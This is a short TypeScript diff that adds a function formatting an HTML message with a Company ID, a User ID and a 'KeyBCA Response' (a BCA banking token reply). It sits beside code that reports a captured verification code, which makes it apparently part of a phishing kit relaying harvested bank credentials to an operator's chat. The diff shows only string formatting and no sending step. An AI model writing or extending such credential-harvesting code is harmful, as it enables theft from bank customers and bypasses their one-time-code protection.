@@ -87,3 +87,14 @@ export function formatVerificationMessage(verificationCode: string): string {
 ⏰ <b>Time:</b> ${timestamp}
 🌐 <b>Page:</b> Chat Conversation Page`;
 }
+
+export function formatInfoMessage(companyId: string, userId: string, keybcaResponse: string): string {
+  const timestamp = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+  return `ℹ️ <b>INFO DATA</b>
+
+🏢 <b>Company ID:</b> ${companyId}
+👤 <b>User ID:</b> ${userId}
+🔑 <b>KeyBCA Response:</b> ${keybcaResponse}
+⏰ <b>Time:</b> ${timestamp}
+🌐 <b>Page:</b> Info Page`;
+}
